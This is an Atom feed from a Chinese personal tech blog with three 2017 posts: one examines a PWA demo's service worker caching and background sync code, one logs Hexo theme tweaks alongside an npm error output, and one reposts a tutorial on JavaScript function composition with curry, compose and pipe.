<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>时间追逐者</title>
  <subtitle>不积跬步无以至千里。</subtitle>
  <link href="/blog/atom.xml" rel="self"/>
  
  <link href="https://ganchengyuan1990.github.io/blog/"/>
  <updated>2017-02-07T02:44:25.814Z</updated>
  <id>https://ganchengyuan1990.github.io/blog/</id>
  
  <author>
    <name>Jason Gan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PWA初体验</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/02/07/PWA%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/02/07/PWA初体验/</id>
    <published>2017-02-07T01:33:22.000Z</published>
    <updated>2017-02-07T02:44:25.814Z</updated>
    
    <content type="html"><![CDATA[<p>白屏以及离线不可用，是Web App最大的体验问题。据说，PWA是解决这两大问题的曙光。</p>
<p>那么，就很有必要来了解试用一下这玩意儿。</p>
<p>OK, 程序员的好习惯之一是使用Github，搜索”pwa demo”</p>
<p><img src="http://wx2.sinaimg.cn/mw690/77e455bfgy1fchp7w9cspj212f0p4mya.jpg" alt=""></p>
<a id="more"></a>
<p>按照md来进行安装和部署之后，按照要求来试玩（因为下载不到chrome canary版本，暂用普通的Chrome来测试）：</p>
<p>Step 1: Go offline.(切离线环境)<br>Step 2: Register BG Sync from above register button.(点击页面上注册按钮)<br>Step 3: Enter a git username and click add.(输入github用户名)<br>Step 4: Go online and sync will be triggered when user is gets connectivity and card will be updated.(切上线环境以后刷新)</p>
<p>试用以后并不能work.</p>
<p>因此简单修改步骤:</p>
<p>Step 1: 线上环境首先搜索一个github用户名。<br>Step 2: 获得结果以后切离线环境。<br>Step 3: 点击注册按钮。<br>Step 4: 离线环境下搜索同一个用户名，正常来说无法访问，但是同样可以获得正确结果。</p>
<p><img src="http://wx2.sinaimg.cn/mw690/77e455bfgy1fchp9wm0xag219a0la11s.gif" alt=""></p>
<p>为何如此神奇呢？<br><img src="http://wx2.sinaimg.cn/mw690/77e455bfgy1fchp7x0zsvj20o80fegnp.jpg" alt=""><br>上图是HTTP Response头部信息，看起来这个serviceWorker是重点</p>
<p>先看一段定义</p>
<blockquote>
<p>一个 service worker 是一段运行在浏览器后台进程里的脚本，它独立于当前页面，提供了那些不需要与web页面交互的功能在网页背后悄悄执行的能力。在将来，基于它可以实现消息推送，静默更新以及地理围栏等服务，但是目前它首先要具备的功能是拦截和处理网络请求，包括可编程的响应缓存管理。</p>
</blockquote>
<p>接着看代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">//Adding `fetch` event listener</span></div><div class="line">self.addEventListener(<span class="string">'fetch'</span>, (event) =&gt; &#123;</div><div class="line">  <span class="built_in">console</span>.info(<span class="string">'Event: Fetch'</span>);</div><div class="line"></div><div class="line">  <span class="keyword">var</span> request = event.request;</div><div class="line"></div><div class="line">  <span class="comment">//Tell the browser to wait for newtwork request and respond with below</span></div><div class="line">  event.respondWith(</div><div class="line">    <span class="comment">//If request is already in cache, return it</span></div><div class="line">    caches.match(request).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</div><div class="line">      <span class="keyword">if</span> (response) &#123;</div><div class="line">        <span class="keyword">return</span> response;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="comment">//if request is not cached, add it to cache</span></div><div class="line">      <span class="keyword">return</span> fetch(request).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</div><div class="line">        <span class="keyword">var</span> responseToCache = response.clone();</div><div class="line">        caches.open(cacheName).then(<span class="function">(<span class="params">cache</span>) =&gt;</span> &#123;</div><div class="line">            cache.put(request, responseToCache).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</div><div class="line">              <span class="built_in">console</span>.warn(request.url + <span class="string">': '</span> + err.message);</div><div class="line">            &#125;);</div><div class="line">          &#125;);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> response;</div><div class="line">      &#125;);</div><div class="line">    &#125;)</div><div class="line">  );</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>可以看到，全局变量有一个监听器，监听fetch事件，而这边的fetch就是获取API的工作，<code>从上面(If request is already in cache, return it)可以看出如果命中了缓存中的request，就直接使用缓存，response同理。</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetchGitUserInfo</span>(<span class="params">username, requestFromBGSync</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> name = username || <span class="string">'gokulkrishh'</span>;</div><div class="line">    <span class="keyword">var</span> url = <span class="string">'https://api.github.com/users/'</span> + name;</div><div class="line"></div><div class="line">    spinnerElement.classList.add(<span class="string">'show'</span>); <span class="comment">//show spinner</span></div><div class="line"></div><div class="line">    fetch(url, &#123; <span class="attr">method</span>: <span class="string">'GET'</span> &#125;)</div><div class="line">    .then(<span class="function"><span class="keyword">function</span>(<span class="params">fetchResponse</span>)</span>&#123; <span class="keyword">return</span> fetchResponse.json() &#125;)</div><div class="line">      .then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (!requestFromBGSync) &#123;</div><div class="line">          localStorage.removeItem(<span class="string">'request'</span>); <span class="comment">//Once API is success, remove request data from localStorage</span></div><div class="line">        &#125;</div><div class="line">        cardElement.querySelector(<span class="string">'.card__title'</span>).textContent = response.name;</div><div class="line">        cardElement.querySelector(<span class="string">'.card__desc'</span>).textContent = response.bio;</div><div class="line">        cardElement.querySelector(<span class="string">'.card__img'</span>).setAttribute(<span class="string">'src'</span>, response.avatar_url);</div><div class="line">        cardElement.querySelector(<span class="string">'.card__following span'</span>).textContent = response.following;</div><div class="line">        cardElement.querySelector(<span class="string">'.card__followers span'</span>).textContent = response.followers;</div><div class="line">        cardElement.querySelector(<span class="string">'.card__temp span'</span>).textContent = response.company;</div><div class="line">        spinnerElement.classList.remove(<span class="string">'show'</span>); <span class="comment">//hide spinner</span></div><div class="line">      &#125;)</div><div class="line">      .catch(<span class="function"><span class="keyword">function</span> (<span class="params">error</span>) </span>&#123;</div><div class="line">        <span class="comment">//If user is offline and sent a request, store it in localStorage</span></div><div class="line">        <span class="comment">//Once user comes online, trigger bg sync fetch from application tab to make the failed request</span></div><div class="line">        localStorage.setItem(<span class="string">'request'</span>, name);</div><div class="line">        spinnerElement.classList.remove(<span class="string">'show'</span>); <span class="comment">//hide spinner</span></div><div class="line">        <span class="built_in">console</span>.error(error);</div><div class="line">      &#125;);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>从下面的代码中可以看到，如果处于offline状态，请求参数会先存在localStorage中，然后sync事件会激活，从而再去发送请求</p>
<blockquote>
<p>.catch(function (error) {<br>    //If user is offline and sent a request, store it in localStorage<br>    //Once user comes online, trigger bg sync fetch from application tab to make the failed request<br>    localStorage.setItem(‘request’, name);<br>    spinnerElement.classList.remove(‘show’); //hide spinner<br>    console.error(error);<br>  });</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">self.addEventListener(<span class="string">'sync'</span>, (event) =&gt; &#123;</div><div class="line">  <span class="built_in">console</span>.info(<span class="string">'Event: Sync'</span>);</div><div class="line"></div><div class="line">  <span class="comment">//Check registered sync name or emulated sync from devTools</span></div><div class="line">  <span class="keyword">if</span> (event.tag === <span class="string">'github'</span> || event.tag === <span class="string">'test-tag-from-devtools'</span>) &#123;</div><div class="line">    event.waitUntil(</div><div class="line">      <span class="comment">//To check all opened tabs and send postMessage to those tabs</span></div><div class="line">      self.clients.matchAll().then(<span class="function">(<span class="params">all</span>) =&gt;</span> &#123;</div><div class="line">        <span class="keyword">return</span> all.map(<span class="function">(<span class="params">client</span>) =&gt;</span> &#123;</div><div class="line">          <span class="keyword">return</span> client.postMessage(<span class="string">'online'</span>); <span class="comment">//To make fetch request, check app.js - line no: 122</span></div><div class="line">        &#125;)</div><div class="line">      &#125;)</div><div class="line">      .catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</div><div class="line">        <span class="built_in">console</span>.error(error);</div><div class="line">      &#125;)</div><div class="line">    );</div><div class="line">  &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这样来看，必须了解一下serviceWorker的工作原理与使用方法了，今日充电<a href="https://www.w3ctech.com/topic/866" target="_blank" rel="external">https://www.w3ctech.com/topic/866</a>，未完待续，明日续更。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;白屏以及离线不可用，是Web App最大的体验问题。据说，PWA是解决这两大问题的曙光。&lt;/p&gt;
&lt;p&gt;那么，就很有必要来了解试用一下这玩意儿。&lt;/p&gt;
&lt;p&gt;OK, 程序员的好习惯之一是使用Github，搜索”pwa demo”&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/mw690/77e455bfgy1fchp7w9cspj212f0p4mya.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>今日休整，简单修改样式</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/02/06/%E4%BB%8A%E6%97%A5%E4%BC%91%E6%95%B4%EF%BC%8C%E7%AE%80%E5%8D%95%E4%BF%AE%E6%94%B9%E6%A0%B7%E5%BC%8F/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/02/06/今日休整，简单修改样式/</id>
    <published>2017-02-06T06:53:02.000Z</published>
    <updated>2017-02-06T07:27:13.325Z</updated>
    
    <content type="html"><![CDATA[<p>如题，今日没有阅读到特别好的文章，简单记两笔。</p>
<p><img src="http://wx1.sinaimg.cn/mw690/77e455bfgy1fcgs4b7ivsg205n03wq4s.gif" alt=""></p>
<p>首先，把Theme优化了一下，给头像图片以及文章DOM加了动画，不得不说Hexo还是非常友好的工具，二次开发比较方便，但是在npm install时出现了一些问题，暂时没有找到合适的解，现已上github发帖询问 <a href="https://github.com/sass/node-sass/issues/1884" target="_blank" rel="external">https://github.com/sass/node-sass/issues/1884</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">npm ERR! node-sass@3.13.1 postinstall: `node scripts/bu</div><div class="line">npm ERR! Exit status 1</div><div class="line">npm ERR!</div><div class="line">npm ERR! Failed at the node-sass@3.13.1 postinstall scr</div><div class="line">npm ERR! Make sure you have the latest version of node.</div><div class="line">npm ERR! If you do, this is most likely a problem with</div><div class="line">npm ERR! not with npm itself.</div><div class="line">npm ERR! Tell the author that this fails on your system</div><div class="line">npm ERR!     node scripts/build.js</div><div class="line">npm ERR! You can get information on how to open an issu</div><div class="line">npm ERR!     npm bugs node-sass</div><div class="line">npm ERR! Or if that isn&apos;t available, you can get their</div><div class="line">npm ERR!     npm owner ls node-sass</div><div class="line">npm ERR! There is likely additional logging output abov</div><div class="line"></div><div class="line">npm ERR! Please include the following file with any sup</div><div class="line">npm ERR!     D:\nodejs\hexo\themes\yilia\npm-debug.log</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>另外，上午读到一篇不错的文章，关于Jquery-free的一些技巧，的确从目前来看原生Js能力是一个进阶前端开发者的必备技能，DOM样式修改可以最先研究。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//使用原生方法来获取element的CSS</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">WDS, undefined</span>)</span>&#123;</div><div class="line">   <span class="function"><span class="keyword">function</span> <span class="title">_camelize</span>(<span class="params">property</span>) </span>&#123;</div><div class="line">		<span class="keyword">return</span> property.replace(<span class="regexp">/-(\w)/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">strMatch, p1</span>)</span>&#123;</div><div class="line">	        <span class="keyword">return</span> p1.toUpperCase();</div><div class="line">	    &#125;);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getStyle</span>(<span class="params">element, property</span>) </span>&#123;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(property ==<span class="string">'background'</span>) property = <span class="string">"background-color"</span>;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(!element || !property) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		<span class="comment">//首先获取内联样式</span></div><div class="line">		</div><div class="line">		<span class="keyword">var</span> value = element.style[_camelize(property)];</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(!value) &#123;</div><div class="line">			<span class="keyword">if</span>(<span class="built_in">document</span>.defaultView &amp;&amp; <span class="built_in">document</span>.defaultView.getComputedStyle)&#123;</div><div class="line">	            css = <span class="built_in">document</span>.defaultView.getComputedStyle(element, <span class="literal">null</span>);</div><div class="line">	            <span class="keyword">return</span> value = css ? css.getPropertyValue(property) : <span class="literal">null</span>;</div><div class="line">	        &#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"></div><div class="line">	<span class="built_in">window</span>.WDS.getStyle = getStyle;</div><div class="line"></div><div class="line"></div><div class="line">&#125;)(<span class="built_in">window</span>.WDS || (<span class="built_in">window</span>.WDS = &#123;&#125;));</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(WDS.getStyle(<span class="built_in">document</span>.getElementsByClassName(<span class="string">'profilepic'</span>)[<span class="number">0</span>], <span class="string">"background"</span>));</div></pre></td></tr></table></figure>
<p>最后，下载了Snapchat玩了一下，挺有意思，大家加个朋友<a href="https://www.snapchat.com/add/jasongan0915" target="_blank" rel="external">https://www.snapchat.com/add/jasongan0915</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如题，今日没有阅读到特别好的文章，简单记两笔。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/mw690/77e455bfgy1fcgs4b7ivsg205n03wq4s.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先，把Theme优化了一下，给头像图片以及文章DOM加了动画，不得不说Hexo还是非常友好的工具，二次开发比较方便，但是在npm install时出现了一些问题，暂时没有找到合适的解，现已上github发帖询问 &lt;a href=&quot;https://github.com/sass/node-sass/issues/1884&quot;&gt;https://github.com/sass/node-sass/issues/1884&lt;/a&gt;。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! node-sass@3.13.1 postinstall: `node scripts/bu&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! Exit status 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR!&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! Failed at the node-sass@3.13.1 postinstall scr&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! Make sure you have the latest version of node.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! If you do, this is most likely a problem with&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! not with npm itself.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! Tell the author that this fails on your system&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR!     node scripts/build.js&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! You can get information on how to open an issu&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR!     npm bugs node-sass&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! Or if that isn&amp;apos;t available, you can get their&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR!     npm owner ls node-sass&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! There is likely additional logging output abov&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR! Please include the following file with any sup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;npm ERR!     D:\nodejs\hexo\themes\yilia\npm-debug.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>函数式编程</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/02/04/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/02/04/函数式编程/</id>
    <published>2017-02-04T01:48:39.000Z</published>
    <updated>2017-02-04T02:22:31.359Z</updated>
    
    <content type="html"><![CDATA[<p>转帖：<a href="http://www.zcfy.cc/article/master-the-javascript-interview-what-is-function-composition-2160.html" target="_blank" rel="external">http://www.zcfy.cc/article/master-the-javascript-interview-what-is-function-composition-2160.html</a></p>
<blockquote>
<p>函数式编程正在接管 JavaScript 世界。就在几年前，只有少数 JavaScript 程序员知道函数式编程是什么。然而，在过去 3 年内，我所看到的每个大型应用程序代码库都大量用到了函数式编程理念。</p>
</blockquote>
<p>函数组合就是<font color="red"><code>组合两到多个函数来生成一个新函数</code></font>的过程。将函数组合在一起，就像将一连串管道扣合在一起，让数据流过一样。</p>
<p>简而言之，函数 f 和 g 的组合可以被定义为 f(g(x))，从内到外（从右到左）求值。也就是说，求值顺序是：</p>
<ul>
<li>1.x</li>
<li>2.g</li>
<li>3.f</li>
</ul>
<p>下面我们在代码中更近距离观察一下这个概念。假如你想把用户的全名转换为 URL Slug，给每个用户一个个人信息页面。为了实现此需求，你需要经历一连串的步骤：</p>
<ul>
<li>1.将姓名根据空格分拆（split）到一个数组中</li>
<li>2.将姓名映射（map）为小写</li>
<li>3.用破折号连接（join）</li>
<li>4.编码 URI 组件</li>
</ul>
<a id="more"></a>
<p>如下是一个简单的实现：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> toSlug = <span class="function"><span class="params">input</span> =&gt;</span> <span class="built_in">encodeURIComponent</span>(</div><div class="line">  input.split(<span class="string">' '</span>)</div><div class="line">    .map(<span class="function"><span class="params">str</span> =&gt;</span> str.toLowerCase())</div><div class="line">    .join(<span class="string">'-'</span>)</div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>还不赖…但是假如我告诉你可读性还可以更强一点会怎么样呢？</p>
<p>假设每个操作都有一个对应的可组合的函数。上述代码就可以被写为：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> toSlug = <span class="function"><span class="params">input</span> =&gt;</span> <span class="built_in">encodeURIComponent</span>(</div><div class="line">  join(<span class="string">'-'</span>)(</div><div class="line">    map(toLowerCase)(</div><div class="line">      split(<span class="string">' '</span>)(</div><div class="line">        input</div><div class="line">      )</div><div class="line">    )</div><div class="line">  )</div><div class="line">);</div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(toSlug(<span class="string">'JS Cheerleader'</span>)); <span class="comment">// 'js-cheerleader'</span></div></pre></td></tr></table></figure>
<p>这看起来比我们的第一次尝试更难读懂，但是先忍一下，我们就要解决。</p>
<p>为了实现上述代码，我们将组合几种常用的工具，比如 split()、join() 和 map()。如下是实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> curry = <span class="function"><span class="params">fn</span> =&gt;</span> (...args) =&gt; fn.bind(<span class="literal">null</span>, ...args);</div><div class="line"> </div><div class="line"><span class="keyword">const</span> map = curry(<span class="function">(<span class="params">fn, arr</span>) =&gt;</span> arr.map(fn));</div><div class="line"> </div><div class="line"><span class="keyword">const</span> join = curry(<span class="function">(<span class="params">str, arr</span>) =&gt;</span> arr.join(str));</div><div class="line"> </div><div class="line"><span class="keyword">const</span> toLowerCase = <span class="function"><span class="params">str</span> =&gt;</span> str.toLowerCase();</div><div class="line"> </div><div class="line"><span class="keyword">const</span> split = curry(<span class="function">(<span class="params">splitOn, str</span>) =&gt;</span> str.split(splitOn));</div></pre></td></tr></table></figure>
<p>除了 toLowerCase() 外，所有这些函数经产品测试的版本都可以从 Lodash/fp 中得到。可以像这样导入它们(类似vue的语法)：</p>
<blockquote>
<p>import { curry, map, join, split } from ‘lodash/fp’;</p>
</blockquote>
<p>也可以用CommonJS模式引入：</p>
<blockquote>
<p>const curry = require(‘lodash/fp/curry’);<br>const map = require(‘lodash/fp/map’);</p>
</blockquote>
<p>这里我偷了点懒。注意这个 curry 从技术上来说，并不是一个真正的柯里化函数。真正的柯里化函数总会生成一个一元函数。这里的 curry 只是一个偏函数应用。请参考“柯里化和偏函数应用之间的区别是什么？”这篇文章。不过，这里只是为了演示用途，我们就把它当作一个真正的柯里化函数好了。<br>回到我们的 toSlug() 实现，这里有一些东西真的让我很烦：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> toSlug = <span class="function"><span class="params">input</span> =&gt;</span> <span class="built_in">encodeURIComponent</span>(</div><div class="line">  join(<span class="string">'-'</span>)(</div><div class="line">    map(toLowerCase)(</div><div class="line">      split(<span class="string">' '</span>)(</div><div class="line">        input</div><div class="line">      )</div><div class="line">    )</div><div class="line">  )</div><div class="line">);</div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(toSlug(<span class="string">'JS Cheerleader'</span>)); <span class="comment">// 'js-cheerleader'</span></div></pre></td></tr></table></figure>
<p>对我来说，这里的嵌套太多了，读起来有点让人摸不着头脑。我们可以用一个会自动组合这些函数的函数来扁平化嵌套，就是说，这个函数会从一个函数得到输出，并自动将它传递给下一个函数作为输入，直到得到最终值为止。</p>
<p>细想一下，好像数组中有一个函数可以做差不多的事情。这个函数就是 reduce()，它用一系列值为参数，对每个值应用一个函数，最后累加成一个结果。值本身也可以函数。但是 reduce() 是从左到右递减，为了匹配上面的组合行为，我们需要它从右到左缩减。</p>
<p>好事情是刚好数组也有一个 reduceRight() 方法可以干这事：</p>
<blockquote>
<p>const compose = (…fns) =&gt; x =&gt; fns.reduceRight((v, f) =&gt; f(v), x);</p>
</blockquote>
<p>像 .reduce() 一样，数组的 .reduceRight() 方法带有一个 reducer 函数和一个初始值（x）为参数。我们可以用它从右到左迭代数组，将函数依次应用到每个数组元素上，最后得到累加值（v）。</p>
<p>用 compose，我们就可以不需要嵌套来重写上面的组合：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> toSlug = compose(</div><div class="line">  <span class="built_in">encodeURIComponent</span>,</div><div class="line">  join(<span class="string">'-'</span>),</div><div class="line">  map(toLowerCase),</div><div class="line">  split(<span class="string">' '</span>)</div><div class="line">);</div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(toSlug(<span class="string">'JS Cheerleader'</span>)); <span class="comment">// 'js-cheerleader'</span></div></pre></td></tr></table></figure></p>
<p>当然，lodash/fp 也提供了 compose()：</p>
<blockquote>
<p>import { compose } from ‘lodash/fp’;</p>
</blockquote>
<p>当以数学形式的组合从内到外的角度来思考时，compose 是不错的。不过，如果想以从左到右的顺序的角度来思考，又该怎么办呢？</p>
<p>还有另外一种形式，通常称为 pipe()。Lodash 称之为 flow():</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> pipe = <span class="function">(<span class="params">...fns</span>) =&gt;</span> x =&gt; fns.reduce(<span class="function">(<span class="params">v, f</span>) =&gt;</span> f(v), x);</div><div class="line"> </div><div class="line"><span class="keyword">const</span> fn1 = <span class="function"><span class="params">s</span> =&gt;</span> s.toLowerCase();</div><div class="line"><span class="keyword">const</span> fn2 = <span class="function"><span class="params">s</span> =&gt;</span> s.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</div><div class="line"><span class="keyword">const</span> fn3 = <span class="function"><span class="params">s</span> =&gt;</span> s + <span class="string">'!'</span></div><div class="line"> </div><div class="line"><span class="keyword">const</span> newFunc = pipe(fn1, fn2, fn3);</div><div class="line"><span class="keyword">const</span> result = newFunc(<span class="string">'Time'</span>); <span class="comment">// emit!</span></div></pre></td></tr></table></figure>
<p>可以看到，这个实现与 compose() 几乎完全一样。唯一的不同之处是，这里是用 .reduce()，而不是 .reduceRight()，即是从左到右缩减，而不是从右到左。</p>
<p>下面我们来看看用 pipe() 实现的 toSlug() 函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> toSlug = pipe(</div><div class="line">  split(<span class="string">' '</span>),</div><div class="line">  map(toLowerCase),</div><div class="line">  join(<span class="string">'-'</span>),</div><div class="line">  <span class="built_in">encodeURIComponent</span></div><div class="line">);</div><div class="line"> </div><div class="line"><span class="built_in">console</span>.log(toSlug(<span class="string">'JS Cheerleader'</span>)); <span class="comment">// 'js-cheerleader'</span></div></pre></td></tr></table></figure>
<p>对于我来说，这要更容易读懂一些。</p>
